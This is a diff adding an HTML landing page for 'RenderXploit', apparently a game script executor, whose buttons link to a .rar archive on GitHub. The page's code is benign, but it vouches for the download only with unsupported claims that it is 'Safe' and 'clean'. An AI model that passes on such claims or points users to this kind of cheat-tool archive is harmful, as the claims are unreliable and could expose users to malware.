@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RenderXploits</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1c2526 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            font-family: Arial, sans-serif;
+        }
+        .pulse-btn:hover {
+            animation: pulse 1s infinite;
+        }
+        .scroll-reveal {
+            opacity: 0;
+            transition: all 0.8s ease-out;
+        }
+        .scroll-reveal.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    </style>
+</head>
+<body class="text-gray-200">
+    <header class="py-4 px-4 bg-black/70 sticky top-0">
+        <nav class="flex items-center justify-between max-w-4xl mx-auto">
+            <div>
+                <h1 class="text-2xl font-bold text-red-500 animate__animated animate__fadeIn">RenderXploit</h1>
+            </div>
+            <div class="flex space-x-4">
+                <a href="#download" class="text-gray-400 hover:text-red-500 animate__animated animate__fadeIn animate__delay-1s">Download</a>
+                <a href="#features" class="text-gray-400 hover:text-red-500 animate__animated animate__fadeIn animate__delay-1s">Why Its Fire</a>
+                <a href="#about" class="text-gray-400 hover:text-red-500 animate__animated animate__fadeIn animate__delay-1s">About</a>
+            </div>
+        </nav>
+    </header>
+
+    <main class="flex-grow max-w-4xl mx-auto px-4">
+        <section id="hero" class="py-12 text-center scroll-reveal" style="transform: translateY(20px);">
+            <h2 class="text-4xl font-bold text-white mb-4 animate__animated animate__bounceIn">Grab RenderXploit</h2>
+            <p class="text-lg text-gray-400 mb-6 animate__animated animate__fadeIn animate__delay-1s">Safe</p>
+            <a href="https://raw.githubusercontent.com/Showcaser1/web/main/RenderXploit.rar" class="inline-block bg-red-600 text-white font-bold py-2 px-4 rounded hover:bg-red-700 pulse-btn animate__animated animate__pulse animate__infinite">Snag It Now</a>
+        </section>
+
+        <section id="features" class="py-8 scroll-reveal" style="transform: translateY(20px);">
+            <h3 class="text-2xl font-bold text-center text-white mb-6 animate__animated animate__fadeInUp">Whats Dope About It</h3>
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                <div class="bg-gray-900 p-4 rounded animate__animated animate__fadeInLeft">
+                    <h4 class="text-lg font-bold text-red-500 mb-2">quick</h4>
+                    <p class="text-gray-400">Scripts loads fast, no waiting around forever.</p>
+                </div>
+                <div class="bg-gray-900 p-4 rounded animate__animated animate__fadeInRight">
+                    <h4 class="text-lg font-bold text-red-500 mb-2">Safe Vibes</h4>
+                    <p class="text-gray-400">no sketchy stuff, just clean and you can trust it.</p>
+                </div>
+                <div class="bg-gray-900 p-4 rounded animate__animated animate__fadeInLeft animate__delay-1s">
+                    <h4 class="text-lg font-bold text-red-500 mb-2">Velocity Team API</h4>
+                    <p class="text-gray-400">Shoutout to Velocity Team for their API, I fixed some bugs to make it run better.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="download" class="py-8 text-center scroll-reveal" style="transform: translateY(20px);">
+            <h3 class="text-2xl font-bold text-white mb-4 animate__animated animate__zoomIn">Wanna try it?</h3>
+            <p class="text-gray-400 mb-4 animate__animated animate__fadeIn animate__delay-1s">Download</p>
+            <a href="https://raw.githubusercontent.com/Showcaser1/web/main/RenderXploit.rar" class="inline-block bg-red-600 text-white font-bold py-2 px-4 rounded hover:bg-red-700 pulse-btn animate__animated animate__pulse animate__infinite">Get It</a>
+        </section>
+
+        <section id="about" class="py-8 text-center scroll-reveal" style="transform: translateY(20px);">
+            <h3 class="text-2xl font-bold text-white mb-4 animate__animated animate__fadeInUp">Who Made This</h3>
+            <p class="text-gray-400 max-w-md mx-auto animate__animated animate__fadeIn animate__delay-1s">friends and me</p>
+        </section>
+    </main>
+
+    <footer class="py-4 px-4 bg-black text-center">
+        <p class="text-gray-400 animate__animated animate__fadeIn">2025 RenderXploit. Made by friends Powered by <a href="#" class="text-red-500 hover:underline">Velocity Team API</a>.</p>
+    </footer>
+
+    <script>
+        const scrollReveals = document.querySelectorAll('.scroll-reveal');
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('visible');
+                    observer.unobserve(entry.target);
+                }
+            });
+        }, { threshold: 0.1 });
+
+        scrollReveals.forEach(el => observer.observe(el));
+    </script>
+</body>
+</html>
